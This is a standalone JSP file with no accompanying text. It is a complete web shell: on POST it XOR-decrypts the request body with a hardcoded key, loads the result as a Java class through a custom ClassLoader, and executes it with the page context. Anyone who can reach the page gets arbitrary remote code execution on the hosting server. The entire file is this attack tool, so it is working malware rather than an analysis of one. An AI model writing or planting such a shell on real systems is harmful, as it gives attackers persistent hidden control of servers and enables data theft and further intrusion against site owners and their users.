<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
public byte[] Decrypt(byte[] data) throws Exception {
        String key = "66ad8189b162255a";
        byte[] keyBytes = key.getBytes();
        for (int i = 0; i < data.length; i++) {
            data[i] ^= keyBytes[(i + 1) & 15];
            data[i] ^= keyBytes[(i + 5) & 15];
            data[i] ^= keyBytes[(i + 9) & 15];
        }
        return data;
    }
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
ByteArrayOutputStream bos = new ByteArrayOutputStream();
byte[] buf = new byte[512];
int length=request.getInputStream().read(buf);
while (length>0)
{
    byte[] data= Arrays.copyOfRange(buf,0,length);
    bos.write(data);
    length=request.getInputStream().read(buf);
}
out.clear();
out=pageContext.pushBody();
new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>